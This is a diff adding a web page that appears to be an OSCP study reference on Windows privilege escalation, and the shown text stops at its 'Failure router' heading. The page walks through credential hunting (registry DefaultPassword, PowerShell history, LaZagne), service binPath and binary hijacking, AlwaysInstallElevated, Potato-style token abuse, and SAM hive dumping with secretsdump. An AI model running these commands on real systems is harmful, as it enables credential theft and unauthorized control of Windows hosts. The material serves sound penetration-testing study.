@@ -1,0 +1,456 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="generator" content="Astro v7.2.0"><meta name="description" content="Commands, variants, interpretation and next actions for Windows Privilege Escalation."><meta name="theme-color" content="#121414"><link rel="canonical" href="https://armaanleg3nd.github.io/tools/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/"><link rel="icon" href="/favicon.svg" type="image/svg+xml"><meta property="og:title" content="Windows Privilege Escalation | OSCP reference | Armaan"><meta property="og:description" content="Commands, variants, interpretation and next actions for Windows Privilege Escalation."><meta property="og:type" content="website"><meta property="og:url" content="https://armaanleg3nd.github.io/tools/oscp/reference/05-local-privilege-escalation/02-windows-privilege-escalation/"><title>Windows Privilege Escalation | OSCP reference | Armaan</title><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_assets/ClientRouter.astro_astro_type_script_index_0_lang.xc6nT38P.js"></script><link rel="stylesheet" href="/_assets/BaseLayout.C8rLAhpp.css"><link rel="stylesheet" href="/_assets/ToolLayout.Bh0Ez8ox.css"><style>.full-reference{max-width:1420px;color:var(--text);margin:auto;padding:2rem clamp(1rem,4vw,4rem) 5rem}.full-reference a{color:var(--cyan-soft)}.full-reference h1{margin:1.25rem 0;font-size:clamp(1.7rem,3vw,2.5rem);line-height:1.2}.full-reference p{color:var(--muted);max-width:80ch;line-height:1.8}.reference-find{gap:.6rem;max-width:44rem;margin:1.5rem 0;font-size:.85rem;display:grid}.reference-find input{border:1px solid var(--line-strong);background:var(--surface-low);color:var(--text);border-radius:3px;padding:.8rem}.reference-index{grid-template-columns:repeat(2,minmax(0,1fr));gap:2rem;display:grid}.reference-index section{min-width:0}.reference-index h2{text-transform:capitalize;border-bottom:1px solid var(--line);padding-bottom:.7rem;font-size:1.2rem}.reference-index h3{margin:1.3rem 0 .5rem;font-size:1rem}.reference-index ul{padding-left:1.2rem;font-size:.84rem;line-height:1.9}.reference-index .level-3{color:var(--muted);margin-left:1rem;font-size:.76rem}.reference-index [hidden]{display:none}.reference-reading{grid-template-columns:240px minmax(0,1fr);gap:2.5rem;display:grid}.reference-reading nav{top:calc(var(--header-height) + 1rem);max-height:calc(100dvh - var(--header-height) - 2rem);border-right:1px solid var(--line);align-self:start;padding:1rem;font-size:.76rem;position:sticky;overflow:auto}.reference-reading nav ul{padding:0;list-style:none}.reference-reading nav li{margin:.7rem 0;line-height:1.5}.reference-reading nav .level-3{padding-left:1rem;font-size:.7rem}.reference-prose{min-width:0;line-height:1.85}.reference-prose :is(h1,h2,h3,h4){scroll-margin-top:calc(var(--header-height) + 1.5rem);margin:2rem 0 1rem;line-height:1.35}.reference-prose h2{border-top:1px solid var(--line);padding-top:1.5rem;font-size:1.35rem}.reference-prose h3{font-size:1.05rem}.reference-prose pre{border:1px solid var(--line);background:var(--surface-low);max-width:100%;font:.8rem/1.75 var(--mono);border-radius:3px;padding:2.5rem 1rem 1rem;position:relative;overflow:auto}.reference-prose [data-reference-copy]{border:1px solid var(--line);color:var(--cyan-soft);font:.65rem var(--mono);cursor:pointer;background:0 0;padding:.2rem .5rem;position:absolute;top:.4rem;right:.5rem}.reference-prose code{overflow-wrap:anywhere;font-size:.85em}.reference-prose pre code{overflow-wrap:normal;font-size:inherit}.reference-prose blockquote{border-left:2px solid var(--cyan);color:var(--muted);margin:1.25rem 0;padding-left:1rem}.reference-prose table{border-collapse:collapse;max-width:100%;font-size:.8rem;display:block;overflow:auto}.reference-prose :is(td,th){border:1px solid var(--line);text-align:left;padding:.6rem}.reference-prose img{max-width:100%;height:auto}.reference-prose details{border-top:1px solid var(--line);padding:.8rem 0}.reference-prose summary{cursor:pointer;color:var(--cyan-soft)}@media (width<=850px){.reference-index,.reference-reading{grid-template-columns:1fr}.reference-reading nav{border:1px solid var(--line);max-height:18rem;position:static}.full-reference{padding-top:1rem}}
+</style><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: page-content; }@layer astro { ::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back]::view-transition-old(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back]::view-transition-new(page-content) { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }[data-astro-transition=back][data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeOut; }[data-astro-transition=back][data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition=back][data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { 
+	animation-duration: 180ms;
+	animation-timing-function: cubic-bezier(0.76, 0, 0.24, 1);
+	animation-fill-mode: both;
+	animation-name: astroFadeIn; }</style></head><body><a class="skip-link" href="#main-content">Skip to content</a><header class="site-header" data-astro-cid-wpvy4v7s><nav class="site-nav" aria-label="Primary navigation" data-astro-cid-wpvy4v7s><a class="brand" href="/" aria-label="leg3nd home" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>leg3nd</span><small data-astro-cid-wpvy4v7s>Projects &amp; tools</small></a><button class="nav-toggle" type="button" aria-expanded="false" aria-controls="nav-links" data-astro-cid-wpvy4v7s><span data-astro-cid-wpvy4v7s>MENU</span><span class="nav-toggle__glyph" aria-hidden="true" data-astro-cid-wpvy4v7s>[+]</span></button><div class="nav-links" id="nav-links" data-astro-cid-wpvy4v7s><a href="/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>01</span>Home</a><a href="/projects/" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>02</span>Projects</a><a href="/tools/" class="active" aria-current="page" data-astro-cid-wpvy4v7s><span class="nav-index" data-astro-cid-wpvy4v7s>03</span>Tools</a></div><div class="system-state" aria-label="Timezone" data-astro-cid-wpvy4v7s>GMT+8</div></nav></header><script type="module">var e=()=>{let e=document.querySelector(`.nav-toggle`),t=document.querySelector(`.nav-links`);if(!e||!t||e.dataset.bound===`true`)return;e.dataset.bound=`true`;let n=()=>{e.setAttribute(`aria-expanded`,`false`),t.dataset.open=`false`;let n=e.querySelector(`.nav-toggle__glyph`);n&&(n.textContent=`[+]`)};e.addEventListener(`click`,()=>{let n=e.getAttribute(`aria-expanded`)===`true`;e.setAttribute(`aria-expanded`,String(!n)),t.dataset.open=String(!n);let r=e.querySelector(`.nav-toggle__glyph`);r&&(r.textContent=n?`[+]`:`[-]`)}),t.addEventListener(`click`,e=>{e.target.closest(`a`)&&n()}),e.closest(`nav`)?.addEventListener(`keydown`,t=>{t.key===`Escape`&&(n(),e.focus())})};document.addEventListener(`astro:page-load`,e),e();</script><div data-astro-transition-scope="astro-nfpogox7-1" id="main-content"><div class="tools-surface"><main class="full-reference"><p><a href="/tools/oscp/reference/">← Complete task index</a> · <a href="/tools/oscp/">Workspace</a></p><div class="reference-reading"><nav aria-label="On this page"><strong>On this page</strong><ul><li class="level-2"><a href="#1-establish-token-and-host-state">1. Establish token and host state</a></li><li class="level-2"><a href="#2-interpret-effective-access">2. Interpret effective access</a></li><li class="level-2"><a href="#3-hunt-credentials-and-configuration">3. Hunt credentials and configuration</a></li><li class="level-3"><a href="#stored-credentials-and-powershell-trails">Stored credentials and PowerShell trails</a></li><li class="level-2"><a href="#4-service-control-and-executed-objects">4. Service control and executed objects</a></li><li class="level-3"><a href="#inventory-and-inspect">Inventory and inspect</a></li><li class="level-3"><a href="#modifiable-service-configuration">Modifiable service configuration</a></li><li class="level-2"><a href="#5-unquoted-service-paths">5. Unquoted service paths</a></li><li class="level-2"><a href="#6-dllconfighelper-search-hijacking">6. DLL/config/helper search hijacking</a></li><li class="level-2"><a href="#7-scheduled-tasks-and-autostarts">7. Scheduled tasks and autostarts</a></li><li class="level-3"><a href="#scheduled-tasks">Scheduled tasks</a></li><li class="level-2"><a href="#8-alwaysinstallelevated-and-uac-context">8. AlwaysInstallElevated and UAC context</a></li><li class="level-2"><a href="#9-token-privilege-routes">9. Token privilege routes</a></li><li class="level-2"><a href="#10-application-driver-and-kernel-candidates">10. Application, driver and kernel candidates</a></li><li class="level-2"><a href="#11-automated-candidate-generation">11. Automated candidate generation</a></li><li class="level-2"><a href="#12-failure-router">12. Failure router</a></li><li class="level-2"><a href="#13-verify-re-enumerate-and-preserve-evidence">13. Verify, re-enumerate and preserve evidence</a></li><li class="level-2"><a href="#jaws--powershell-enumeration-when-the-compiled-helper-is-unsuitable">JAWS — PowerShell enumeration when the compiled helper is unsuitable</a></li><li class="level-2"><a href="#legacy-impersonation-helpers--select-by-os-build-and-trigger">Legacy impersonation helpers — select by OS build and trigger</a></li><li class="level-2"><a href="#accesschk--verify-the-exact-service-file-or-registry-permission">AccessChk — verify the exact service, file or registry permission</a></li><li class="level-2"><a href="#sources">Sources</a></li></ul></nav><article class="reference-prose"><h1 id="windows-privilege-escalation">Windows Privilege Escalation</h1>
+<p><a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/reference/05-local-privilege-escalation/README.md">← Stage index</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/cheatsheets/windows-privesc.md">Quick sheet</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/03-credential-use-and-cracking/">Credential use</a> | <a href="/tools/oscp/reference/04-shells-transfers-credentials/01-file-transfer/">File transfer</a> | <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/Attack_Strategy_Map.md">Strategy map</a> | Study methods: <a href="https://github.com/ArmaanLeg3nd/OSCP-Exploitation-Reference/blob/main/notes/methods/windows-privesc.md">Escalate privileges on Windows</a></p>
+<blockquote>
+<p><strong>Entry:</strong> authorized Windows shell. <strong>Exit:</strong> verified Administrator/high-integrity or SYSTEM process. <strong>Proof chain:</strong> current token → controlled input → effective right → privileged consumer → run-as identity → trigger → verified effect.</p>
+</blockquote>
+<blockquote>
+<p><strong>First pass:</strong> check whoami /all and architecture, then run the reviewed winPEAS baseline in the <a href="#11-automated-candidate-generation">collector section</a>. Read out.txt and follow the exact service/task, token or credential finding; use native checks if the collector is unavailable.</p>
+</blockquote>
+<h2 id="1-establish-token-and-host-state">1. Establish token and host state</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">hostname
+whoami /all
+systeminfo
+ipconfig /all
+route print
+netstat -ano
+tasklist /svc
+query user
+net user
+net localgroup Administrators
+driverquery /v
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ComputerInfo | Select-Object WindowsProductName,WindowsVersion,OsBuildNumber,OsArchitecture
+Get-HotFix | Sort-Object InstalledOn -Descending
+Get-CimInstance Win32_Process | Select-Object ProcessId,Name,ExecutablePath,CommandLine
+Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
+Get-CimInstance Win32_SystemDriver | Select-Object Name,State,StartMode,PathName
+Get-LocalUser
+Get-LocalGroupMember Administrators
+</code></pre>
+<blockquote>
+<p><strong>Interpret:</strong> record user SID, integrity label, enabled/deny-only groups and present/enabled privileges. Administrator membership with Medium integrity is a filtered token, not a high-integrity process. <code>Get-HotFix</code> does not list every update; use build/KB output only to form a version hypothesis.</p>
+</blockquote>
+<details>
+<summary><strong>WMIC compatibility fallbacks</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">wmic qfe get HotFixID,InstalledOn
+wmic service get Name,StartName,State,StartMode,PathName
+wmic process get ProcessId,Name,ExecutablePath,CommandLine
+</code></pre>
+<blockquote>
+<p>WMIC is deprecated and may be absent on newer systems; PowerShell CIM is the baseline.</p>
+</blockquote>
+</details>
+<h2 id="2-interpret-effective-access">2. Interpret effective access</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">icacls "C:\Path\To\OBJECT"
+sc.exe sdshow SERVICE
+accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\OBJECT"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+</code></pre>
+<p><code>icacls</code> common rights: <code>F</code> full, <code>M</code> modify, <code>RX</code> read/execute, <code>R</code> read, <code>W</code> write, <code>D</code> delete. Common inheritance markers: <code>I</code>, <code>OI</code>, <code>CI</code>, <code>IO</code>, <code>NP</code>.</p>
+<blockquote>
+<p>File, directory, registry, service-object, task and process permissions are separate. Check whether the ACE applies to the current user or an enabled group and grants the exact required operation. Mandatory Integrity Control can still block a lower-integrity write.</p>
+</blockquote>
+<h2 id="3-hunt-credentials-and-configuration">3. Hunt credentials and configuration</h2>
+<h3 id="stored-credentials-and-powershell-trails">Stored credentials and PowerShell trails</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">cmdkey /list
+vaultcmd /list
+vaultcmd /listcreds:"Windows Credentials" /all
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">$history = (Get-PSReadLineOption).HistorySavePath
+$history
+Get-Content -LiteralPath $history -ErrorAction SilentlyContinue
+Get-ItemProperty 'HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
+Get-ItemProperty 'HKCU:\Software\Policies\Microsoft\Windows\PowerShell\Transcription' -ErrorAction SilentlyContinue
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -ErrorAction SilentlyContinue |
+  Where-Object Id -in 4103,4104 | Select-Object -First 50 TimeCreated,Id,Message
+</code></pre>
+<blockquote>
+<p>A <code>cmdkey</code> entry is target/context-bound and does not reveal a password. DPAPI-protected data needs the protecting user/machine context and keys. <code>Clear-History</code> does not necessarily clear PSReadLine's saved file.</p>
+</blockquote>
+<details>
+<summary><strong>Targeted application/file/registry search</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultUserName
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v DefaultPassword
+reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
+dir /s /b C:\Windows\Panther\*unattend*.xml C:\Windows\System32\Sysprep\*.xml 2>nul
+dir /s /b C:\Users\*.kdbx C:\Users\*.rdp C:\Users\id_rsa C:\Users\*.ppk 2>nul
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ChildItem C:\inetpub,C:\ProgramData,C:\Users -Recurse -File -ErrorAction SilentlyContinue |
+  Where-Object { $_.Extension -in '.config','.xml','.ini','.txt','.ps1','.bat','.cmd','.yml','.yaml','.json' } |
+  Select-String -Pattern 'password|passwd|secret|token|connectionString|user id=' -CaseSensitive:$false
+</code></pre>
+<blockquote>
+<p>Search from observed applications first. Classify every value by identity, format, scope and compatible service, then use the credential procedure.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Saved credential consumer</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">runas /savecred /user:DOMAIN\USER cmd.exe
+</code></pre>
+<blockquote>
+<p>Use only when <code>cmdkey</code>/context supports that identity and logon type. <code>runas</code> does not inherently bypass UAC; verify the resulting token with <code>whoami /all</code>.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>LaZagne — recover application credentials in the current user's context</strong></summary>
+<p>Use a reviewed Windows build after identifying the current user and installed applications. Start with the relevant family; run broader collection only when useful. User-protected stores depend on that user's profile/decryption context; system-protected stores can need an elevated token.</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">REM Browser-store leads for the current user
+laZagne.exe browsers
+
+REM Broader recovery, with a local text report
+laZagne.exe all -oN
+</code></pre>
+<blockquote>
+<p><strong>Read:</strong> preserve the reported application/account/source with each recovered value. Test a matching service using the credential procedure; a recovered application password is not automatically a domain password. Empty output can mean no supported store, inaccessible profile or failed decryption. Follow manual history/config/vault checks instead of assuming there are no credentials.</p>
+</blockquote>
+<p><a href="https://github.com/AlessandroZ/LaZagne">LaZagne upstream</a>.</p>
+</details>
+<h2 id="4-service-control-and-executed-objects">4. Service control and executed objects</h2>
+<h3 id="inventory-and-inspect">Inventory and inspect</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-CimInstance Win32_Service | Select-Object Name,StartName,State,StartMode,PathName
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">sc.exe qc SERVICE
+sc.exe sdshow SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+accesschk.exe -accepteula -nobanner -v -w -c "USER" SERVICE
+accesschk.exe -accepteula -nobanner -v -w "USER" "C:\Path\To\service.exe"
+</code></pre>
+<blockquote>
+<p><strong>Need:</strong> control of service config, exact binary/script, searched prefix, DLL/config/plugin, or relevant DACL; higher <code>SERVICE_START_NAME</code>; and a start/restart/boot trigger. In PowerShell use <code>sc.exe</code>, because bare <code>sc</code> can resolve to <code>Set-Content</code>.</p>
+</blockquote>
+<h3 id="modifiable-service-configuration">Modifiable service configuration</h3>
+<p>Preserve <code>BINARY_PATH_NAME</code>, account and start mode first:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">sc.exe qc SERVICE
+sc.exe config SERVICE binPath= "C:\Windows\Temp\PAYLOAD_EXE"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<p>Restore:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">sc.exe config SERVICE binPath= "ORIGINAL_BINARY_PATH"
+</code></pre>
+<blockquote>
+<p><code>SERVICE_CHANGE_CONFIG</code> controls <code>binPath</code>; start/stop are separate rights. The space after <code>binPath=</code> is required. Error 1053 may mean a non-service payload ran but did not answer the Service Control Manager; verify the intended effect.</p>
+</blockquote>
+<details>
+<summary><strong>Writable service binary or replaceable parent</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">sc.exe qc SERVICE
+icacls "C:\Path\To\service.exe"
+icacls "C:\Path\To"
+copy /Y "C:\Path\To\service.exe" "C:\Windows\Temp\service.exe.backup"
+copy /Y "C:\Windows\Temp\PAYLOAD_EXE" "C:\Path\To\service.exe"
+sc.exe stop SERVICE
+sc.exe start SERVICE
+</code></pre>
+<blockquote>
+<p>A parent with delete/create rights can permit replacement even when the file is not directly writable. Confirm architecture, file locks, recovery copy and exact trigger.</p>
+</blockquote>
+</details>
+<h2 id="5-unquoted-service-paths">5. Unquoted service paths</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-CimInstance Win32_Service |
+  Where-Object { $_.PathName -match '\s' -and $_.PathName -notmatch '^\s*"' } |
+  Select-Object Name,StartName,State,StartMode,PathName
+</code></pre>
+<p>For <code>C:\Program Files\Vendor App\service.exe -d</code>, check every attempted prefix:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">icacls C:\
+icacls "C:\Program Files"
+icacls "C:\Program Files\Vendor App"
+sc.exe qc SERVICE
+</code></pre>
+<blockquote>
+<p><strong>Confirmed only if:</strong> path contains spaces and is unquoted; an earlier attempted executable such as <code>C:\Program.exe</code> or <code>C:\Program Files\Vendor.exe</code> is absent and creatable; service runs higher; trigger exists. A listed unquoted path alone is a false positive.</p>
+</blockquote>
+<h2 id="6-dllconfighelper-search-hijacking">6. DLL/config/helper search hijacking</h2>
+<p>Confirm:</p>
+<ol>
+<li>exact DLL/helper/config name and architecture;</li>
+<li>privileged process actually requests it;</li>
+<li>selected attacker-writable location precedes the legitimate resolution;</li>
+<li>payload preserves required exports/behavior where necessary;</li>
+<li>reliable trigger exists.</li>
+</ol>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">icacls "C:\Path\To\Application"
+sc.exe qc SERVICE
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs"
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\Session Manager" /v SafeDllSearchMode
+</code></pre>
+<blockquote>
+<p>Modern DLL resolution can apply redirection, API sets, side-by-side manifests, loaded modules, KnownDLLs, package dependencies and application-specific search flags before ordinary directories. Safe DLL search mode is enabled by default. In a suitable lab, Procmon filters for the process, <code>CreateFile</code>, <code>.dll</code>, and <code>NAME NOT FOUND</code> provide decisive runtime evidence; low-privilege remote use may be unavailable.</p>
+</blockquote>
+<h2 id="7-scheduled-tasks-and-autostarts">7. Scheduled tasks and autostarts</h2>
+<h3 id="scheduled-tasks">Scheduled tasks</h3>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">schtasks /query /fo LIST /v
+schtasks /query /tn "\FOLDER\TASK" /xml
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ScheduledTask | ForEach-Object {
+  $t = $_
+  [pscustomobject]@{
+    TaskPath=$t.TaskPath; TaskName=$t.TaskName
+    UserId=$t.Principal.UserId; RunLevel=$t.Principal.RunLevel
+    Actions=($t.Actions | ForEach-Object { "$($_.Execute) $($_.Arguments) [wd=$($_.WorkingDirectory)]" }) -join '; '
+  }
+}
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">icacls "C:\Path\To\task-script.ps1"
+icacls "C:\Path\To"
+schtasks /run /tn "\FOLDER\TASK"
+</code></pre>
+<blockquote>
+<p>Prove action, arguments, working directory, principal, actual trigger and effective ACL. <code>RunLevel Highest</code> means the configured principal's highest available token, not SYSTEM. <code>/run</code> success means the request was accepted; verify process/effect and last-run result.</p>
+</blockquote>
+<details>
+<summary><strong>Run keys and startup consumers</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+dir "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
+dir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+</code></pre>
+<blockquote>
+<p>Need a modifiable consumed value/file plus a higher-privileged boot/logon/application trigger. A writable PATH directory matters only when a privileged consumer invokes an unqualified executable through that effective PATH.</p>
+</blockquote>
+</details>
+<h2 id="8-alwaysinstallelevated-and-uac-context">8. AlwaysInstallElevated and UAC context</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+</code></pre>
+<p>Both values must be <code>0x1</code>:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">msiexec.exe /quiet /qn /i C:\Path\To\PAYLOAD.msi
+</code></pre>
+<blockquote>
+<p>One key or a zero value disproves the route. This is an unsafe installer policy, not a universal UAC bypass.</p>
+</blockquote>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami /groups
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
+reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
+</code></pre>
+<blockquote>
+<p>A UAC bypass normally elevates an already-administrative filtered token. Build/policy-specific bypasses are not a baseline path for a standard user.</p>
+</blockquote>
+<h2 id="9-token-privilege-routes">9. Token privilege routes</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">whoami /priv
+</code></pre>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>Privilege</th><th>Required next proof</th></tr></thead><tbody><tr><td><code>SeImpersonatePrivilege</code></td><td>Compatible privileged client/coercion, impersonation level, build/runtime/tool and process creation</td></tr><tr><td><code>SeAssignPrimaryTokenPrivilege</code></td><td>Useful primary token plus process/quota requirements</td></tr><tr><td><code>SeBackupPrivilege</code></td><td>Enabled privilege, backup-aware read and useful protected data</td></tr><tr><td><code>SeRestorePrivilege</code></td><td>Restore-aware write plus privileged consumer/trigger</td></tr><tr><td><code>SeDebugPrivilege</code></td><td>Usable target process and no protected-process barrier</td></tr><tr><td><code>SeLoadDriverPrivilege</code></td><td>Compatible signed/loadable driver and stable exploit path</td></tr><tr><td><code>SeTakeOwnershipPrivilege</code></td><td>Ownership change, then DACL/content control and consumer</td></tr></tbody></table>
+<details>
+<summary><strong>Impersonation-tool variants</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">PrintSpoofer64.exe -i -c "cmd.exe"
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">GodPotato-NET4.exe -cmd "cmd.exe /c whoami > C:\Windows\Temp\token-proof.txt"
+</code></pre>
+<blockquote>
+<p>Choose by OS build, architecture, runtime and available trigger. A privilege name alone does not select a working “Potato.” Success is a SYSTEM process/effect followed by <code>whoami /all</code>; connection/token/process errors route back to prerequisites.</p>
+</blockquote>
+</details>
+<details>
+<summary><strong>Backup privilege to local credential material</strong></summary>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">reg save HKLM\SAM C:\Windows\Temp\SAM.hive
+reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM.hive
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-bash">impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
+</code></pre>
+<blockquote>
+<p>Use the matched hive pair. Output is local credential material, not automatic SYSTEM/domain/remote authorization; classify and validate it through the credential procedure.</p>
+</blockquote>
+</details>
+<h2 id="10-application-driver-and-kernel-candidates">10. Application, driver and kernel candidates</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*',
+                 'HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue |
+  Select-Object DisplayName,DisplayVersion,Publisher,InstallLocation
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">systeminfo
+driverquery /v
+</code></pre>
+<blockquote>
+<p>Prefer deterministic credential/permission/configuration paths. Then verify exact privileged application or driver version/configuration. Use kernel exploits last after exact build, architecture, cumulative update, mitigations, prerequisites, source and crash risk are checked. Avoid <code>Win32_Product</code>; it is slow and can trigger MSI repair.</p>
+</blockquote>
+<h2 id="11-automated-candidate-generation">11. Automated candidate generation</h2>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-cmd">winPEASx64.exe log
+Seatbelt.exe -group=system -outputfile="C:\Windows\Temp\seatbelt-system.txt"
+Seatbelt.exe -group=user -q -outputfile="C:\Windows\Temp\seatbelt-user.json"
+</code></pre>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-powershell">powershell.exe -ExecutionPolicy Bypass -Command ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report TXT,HTML"
+Import-Module .\PowerUp.ps1
+Invoke-AllChecks
+</code></pre>
+<blockquote>
+<p>winPEAS is broad; Seatbelt is a targeted survey and publishes source rather than official binaries; PrivescCheck evaluates the current token and skips some checks when elevated; PowerUp is useful but its upstream repository was archived. AV/script-policy failure is a tooling limitation—use native checks.</p>
+</blockquote>
+<p>Convert every highlight into:</p>
+<pre><button type="button" data-reference-copy aria-label="Copy command">Copy</button><code class="language-text">CANDIDATE | CURRENT TOKEN | CONTROLLED INPUT | EFFECTIVE RIGHT | CONSUMER | RUN-AS | TRIGGER | EXPECTED EFFECT | STATUS
+</code></pre>
+<h2 id="12-failure-router">12. Failure router</h2>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
